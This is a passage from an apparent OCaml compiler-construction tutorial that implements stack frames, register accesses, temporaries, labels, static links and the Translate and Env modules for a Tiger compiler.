</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* other x64 registers *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">rbx</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rbx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r10</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r10&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r11</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r11&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r12</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r12&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r13</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r13&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r14</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r14&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r15</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r15&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* registers that are preserved by the caller *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">caller_regs</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#434f54">r10</span><span style="color:#728e00">;</span> <span style="color:#434f54">r11</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* registers that are preserved by the callee *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">callee_regs</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#434f54">rbx</span><span style="color:#728e00">;</span> <span style="color:#434f54">r12</span><span style="color:#728e00">;</span> <span style="color:#434f54">r13</span><span style="color:#728e00">;</span> <span style="color:#434f54">r14</span><span style="color:#728e00">;</span> <span style="color:#434f54">r15</span><span style="color:#728e00">]</span>
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Access</p>
<p>The <code>access</code> data type describes location of a formal parameter
or a local variable that may be placed in a frame or in a
register:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">access</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>   <span style="color:#95a5a6">(* memory location at the specific offset from the frame pointer *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">InFrame</span> <span style="color:#728e00">of</span> <span style="color:#00979d">int</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* register location *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">InReg</span> <span style="color:#728e00">of</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span></code></pre></div><p>The rest of the <code>Frame</code> module implementation:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(* creates a new location for a formal parameter or
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">   a local variable, given its index and [esc] flag *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">mk_access</span> <span style="color:#434f54">i</span> <span style="color:#728e00">=</span> <span style="color:#728e00">function</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">true</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">InFrame</span> <span style="color:#728e00">((</span><span style="color:#434f54">i</span> <span style="color:#728e00">+</span> <span style="color:#434f54">1</span><span style="color:#728e00">)</span> <span style="color:#728e00">*</span> <span style="color:#728e00">(-</span><span style="color:#434f54">word_size</span><span style="color:#728e00">))</span> <span style="color:#95a5a6">(* escapes - alloc in frame *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">false</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">InReg</span> <span style="color:#728e00">(</span><span style="color:#434f54">Temp</span>.<span style="color:#434f54">mk</span> <span style="color:#434f54">()</span><span style="color:#728e00">)</span> <span style="color:#95a5a6">(* doesn&#39;t escape - use temp (register) *)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* makes a new stack frame *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">mk</span> <span style="color:#434f54">label</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">=</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">mapi</span> <span style="color:#434f54">mk_access</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">locals</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ref</span> <span style="color:#434f54">0</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* don&#39;t know yet what instructions we need,
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">     so just leave it empty for now *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">instrs</span> <span style="color:#728e00">=</span> <span style="color:#434f54">[]</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">{</span> <span style="color:#434f54">label</span><span style="color:#728e00">;</span> <span style="color:#434f54">formals</span><span style="color:#728e00">;</span> <span style="color:#434f54">locals</span><span style="color:#728e00">;</span> <span style="color:#434f54">instrs</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">{</span> <span style="color:#434f54">formals</span><span style="color:#728e00">;</span> <span style="color:#728e00">_</span> <span style="color:#728e00">}</span> <span style="color:#728e00">=</span> <span style="color:#434f54">formals</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* local variables that do not escape can be allocated in a register,
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">   escaping variables must be allocated in the frame *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">alloc_local</span> <span style="color:#728e00">{</span> <span style="color:#434f54">locals</span><span style="color:#728e00">;</span> <span style="color:#728e00">_</span> <span style="color:#728e00">}</span> <span style="color:#728e00">=</span> <span style="color:#728e00">function</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">true</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">incr</span> <span style="color:#434f54">locals</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">offset</span> <span style="color:#728e00">=</span> <span style="color:#728e00">(!</span><span style="color:#434f54">locals</span> <span style="color:#728e00">+</span> <span style="color:#434f54">1</span><span style="color:#728e00">)</span> <span style="color:#728e00">*</span> <span style="color:#728e00">(-</span><span style="color:#434f54">word_size</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">InFrame</span> <span style="color:#434f54">offset</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">false</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">InReg</span> <span style="color:#728e00">(</span><span style="color:#434f54">Temp</span>.<span style="color:#434f54">mk</span> <span style="color:#434f54">()</span><span style="color:#728e00">)</span>
</span></span></code></pre></div><p><code>alloc_local</code> allocates a new local variable in the given frame
or <a href="#temporaries-and-labels" >in a register</a>. The boolean argument specifies whether the new
variable escapes and needs to go in the frame. Returns in-memory
access with an offset from the frame pointer.</p>
<p><code>alloc_local t true</code>
: → <code>InFrame -4</code></p>
<p><code>alloc_local t true</code>
: → <code>InFrame -8</code></p>
<p><code>alloc_local t false</code>
: → <code>InReg t1</code></p>
<p><code>alloc_local t false</code>
: → <code>InReg t2</code></p>
<p>A clever compiler might optimize the frame size by noticing when
two frame-resident variables could be allocated to the same
slot.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Temporaries and labels</p>
<p>We need a couple of more abstractions to represent a
&ldquo;not known yet&rdquo; register and machine-language locations:</p>
<ul>
<li><strong>Temporary</strong> &ndash; an abstract name for a value that is
temporarily held in some register</li>
<li><strong>Label</strong> (just like label in assembly language) &ndash; an abstract
name for a static machine-language location whose exact
address is yet to be determined</li>
</ul>
<p>The <code>Temp</code> module manages these two distinct sets of names:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(** Abstract name for a local variable that
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    is temporarily held in a register *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">t</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Abstract name for a static memory address that
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    is yet to be determined *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">label</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Returns a new temporary from an infinite set of temporaries *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">mk</span> <span style="color:#728e00">:</span> <span style="color:#00979d">unit</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Returns a new [label], whose assembly-language name is
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    the given string (if given), otherwise it is generated. *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">mk_label</span> <span style="color:#728e00">:</span> <span style="color:#00979d">string</span> <span style="color:#434f54">option</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">label</span>
</span></span></code></pre></div><p>The implementation of the <code>Temp</code> module:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">module</span> <span style="color:#434f54">S</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Symbol</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#00979d">int</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">label</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Symbol</span>.<span style="color:#434f54">t</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">mk</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">idx</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ref</span> <span style="color:#728e00">(-</span><span style="color:#434f54">1</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">fun</span> <span style="color:#434f54">()</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">incr</span> <span style="color:#434f54">idx</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">!</span><span style="color:#434f54">idx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">mk_label</span> <span style="color:#434f54">name</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">idx</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ref</span> <span style="color:#728e00">(-</span><span style="color:#434f54">1</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">match</span> <span style="color:#434f54">name</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">Some</span> <span style="color:#434f54">s</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">S</span>.<span style="color:#434f54">symbol</span> <span style="color:#434f54">s</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">None</span> <span style="color:#728e00">-&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">incr</span> <span style="color:#434f54">idx</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#434f54">name</span> <span style="color:#728e00">=</span> <span style="color:#434f54">string_of_int</span> <span style="color:#728e00">!</span><span style="color:#434f54">idx</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">S</span>.<span style="color:#434f54">symbol</span> <span style="color:#434f54">name</span>
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>View shift</p>
<p>Function arguments are seen differently by the caller and the
callee. In the book this is referred to as the view shift. For
example, a caller my put a parameter into register \(r_6\), but
the callee may want to access it from register \(r_9\). We want
to handle this view shift in the <code>Frame</code> module.</p>
<p>For each formal parameter we should calculate:</p>
<ul>
<li>How it will be seen by callee (in a register, or in a frame
location)</li>
<li>What instructions are required to implement this view shift</li>
</ul>
<p>To keep things simple, we are not going to implement this right
now.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Static links</p>
<p>The <code>Frame</code> module should not know anything about <a href="#static-link--sl" >static links</a>,
because we want it be independent of any specific source
language being compiled. We&rsquo;ll use <a href="#translate-module" >Translate module</a> to manage
static links.</p>
<p>The static link (which is a pointer to the enclosing function)
is passed to a function in a register and stored into the frame,
just like any other escaping formal parameter. So we will treat
it as one by adding another <code>true</code> value at the front the list
of booleans representing formal parameters. It means that for
some function <code>f(x,y)</code> (assuming neigher <code>x</code> nor <code>y</code> escapes)
we&rsquo;ll have the following list:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">[</span><span style="color:#434f54">true</span><span style="color:#728e00">;</span> <span style="color:#434f54">false</span><span style="color:#728e00">;</span> <span style="color:#434f54">false</span><span style="color:#728e00">]</span>
</span></span></code></pre></div><p>Notice the extra <code>true</code> at the beginning.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Translate module</p>
<p>The <code>Translate</code> module handles the notion of nested scopes (via
static links), providing the interface to the <code>Semant</code> module.</p>
<p>We separate <code>Semant</code> from <code>Translate</code> module to avoid a huge,
unweildy module that does both: type checking and semantic
translation.</p>
<p>Ok, I think at this point we are ready to write some initial
implementation:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">expr</span> <span style="color:#728e00">=</span> <span style="color:#00979d">unit</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Represents a nesting level *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">level</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Describes a way to access a formal parameter or a local variable.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    Basically, it is just a [Frame.access] plus a nesting [level] *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">access</span> <span style="color:#728e00">=</span> <span style="color:#434f54">level</span> <span style="color:#728e00">*</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">access</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Outermost level at which all
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    top-level functions and variables are declared *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">outermost</span> <span style="color:#728e00">:</span> <span style="color:#434f54">level</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Creates a new &#34;nesting level&#34; for a function *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">mk</span> <span style="color:#728e00">:</span> <span style="color:#434f54">level</span> <span style="color:#434f54">option</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">label</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">bool</span> <span style="color:#00979d">list</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">level</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Extracts a list of accesses *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">:</span> <span style="color:#434f54">level</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">access</span> <span style="color:#00979d">list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Creates an [access] at the given [level].
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    The argument [bool] specifies whether the variable escapes *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">alloc_local</span> <span style="color:#728e00">:</span> <span style="color:#434f54">level</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">bool</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">access</span>
</span></span></code></pre></div><p>We don&rsquo;t know yet what the <code>expr</code> will be, thats why it is a
type alias for <code>unit</code>. And here is the basic implementation:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">expr</span> <span style="color:#728e00">=</span> <span style="color:#00979d">unit</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">parent</span><span style="color:#728e00">:</span> <span style="color:#434f54">level</span> <span style="color:#434f54">option</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">frame</span><span style="color:#728e00">:</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">access</span> <span style="color:#728e00">=</span> <span style="color:#434f54">level</span> <span style="color:#728e00">*</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">access</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">outermost</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">label</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">mk_label</span> <span style="color:#434f54">None</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">{</span> <span style="color:#434f54">parent</span> <span style="color:#728e00">=</span> <span style="color:#434f54">None</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">frame</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">mk</span> <span style="color:#434f54">label</span> <span style="color:#434f54">[]</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">mk</span> <span style="color:#434f54">parent</span> <span style="color:#434f54">label</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">=</span> <span style="color:#434f54">true</span> <span style="color:#728e00">::</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">frame</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">mk</span> <span style="color:#434f54">label</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">{</span> <span style="color:#434f54">parent</span><span style="color:#728e00">;</span> <span style="color:#434f54">frame</span> <span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* Returns formals (excluding the static link) *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">formals</span> <span style="color:#434f54">lev</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* exclude the SL *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">args</span> <span style="color:#728e00">=</span> <span style="color:#434f54">List</span>.<span style="color:#434f54">tl</span> <span style="color:#728e00">(</span><span style="color:#434f54">Frame</span>.<span style="color:#434f54">formals</span> <span style="color:#434f54">lev</span><span style="color:#728e00">.</span><span style="color:#434f54">frame</span><span style="color:#728e00">)</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">List</span>.<span style="color:#434f54">map</span> <span style="color:#728e00">(</span><span style="color:#728e00">fun</span> <span style="color:#434f54">access</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">lev</span><span style="color:#728e00">,</span> <span style="color:#434f54">access</span><span style="color:#728e00">)</span> <span style="color:#434f54">args</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">alloc_local</span> <span style="color:#434f54">lev</span> <span style="color:#434f54">esc</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">let</span> <span style="color:#434f54">access</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Frame</span>.<span style="color:#434f54">alloc_local</span> <span style="color:#434f54">lev</span><span style="color:#728e00">.</span><span style="color:#434f54">frame</span> <span style="color:#434f54">esc</span> <span style="color:#728e00">in</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">lev</span><span style="color:#728e00">,</span> <span style="color:#434f54">access</span>
</span></span></code></pre></div><p>Notice the <code>formals = true :: formals</code> in the <code>mk</code> function, it
is there to represent a static link.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Env</p>
<p>We must keep the <code>Translate.level</code> along with the <code>Temp.label</code>
in the <code>FunEntry</code>. Also we need to update the <code>VarEntry</code> to
include the <code>Translate.access</code>.</p>
<p>Here is how our updated <code>Env</code> module looks like:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">module</span> <span style="color:#434f54">T</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Type</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">module</span> <span style="color:#434f54">Table</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Symbol</span>.<span style="color:#434f54">Table</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">access</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Variable entry *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">var_entry</span> <span style="color:#728e00">=</span> <span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">access</span><span style="color:#728e00">:</span> <span style="color:#434f54">Translate</span>.<span style="color:#434f54">access</span><span style="color:#728e00">;</span> <span style="color:#95a5a6">(** Describes how to access the variable **)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">ty</span><span style="color:#728e00">:</span> <span style="color:#434f54">T</span>.<span style="color:#434f54">t</span> <span style="color:#95a5a6">(** Type of the variable *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Function entry *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">fun_entry</span> <span style="color:#728e00">=</span> <span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">level</span><span style="color:#728e00">:</span> <span style="color:#434f54">Translate</span>.<span style="color:#434f54">level</span><span style="color:#728e00">;</span> <span style="color:#95a5a6">(** Nesting level *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">label</span><span style="color:#728e00">:</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">label</span><span style="color:#728e00">;</span> <span style="color:#95a5a6">(** Label of the machine-code entry point *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">formals</span><span style="color:#728e00">:</span> <span style="color:#434f54">T</span>.<span style="color:#434f54">t</span> <span style="color:#00979d">list</span><span style="color:#728e00">;</span> <span style="color:#95a5a6">(** Types of the formal parameters *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">result</span><span style="color:#728e00">:</span> <span style="color:#434f54">T</span>.<span style="color:#434f54">t</span> <span style="color:#95a5a6">(** Type of the result returned by the function **)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Term-level entry *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">entry</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">VarEntry</span> <span style="color:#728e00">of</span> <span style="color:#434f54">var_entry</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">|</span> <span style="color:#434f54">FunEntry</span> <span style="color:#728e00">of</span> <span style="color:#434f54">fun_entry</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Contains bindings for predefined functions *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">base_venv</span> <span style="color:#728e00">:</span> <span style="color:#434f54">entry</span> <span style="color:#434f54">Table</span>.<span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Predefined types *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">base_tenv</span> <span style="color:#728e00">:</span> <span style="color:#434f54">T</span>.<span style="color:#434f54">t</span> <span style="color:#434f54">Table</span>.<span style="color:#434f54">t</span>
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Escapes</p>
<p>To calculate which variables should be stored in registers and
which should be allocated in the frame we&rsquo;ll have a special
module named <code>Escape</code>.</p>
<p>Here its interface in OCaml:</p>
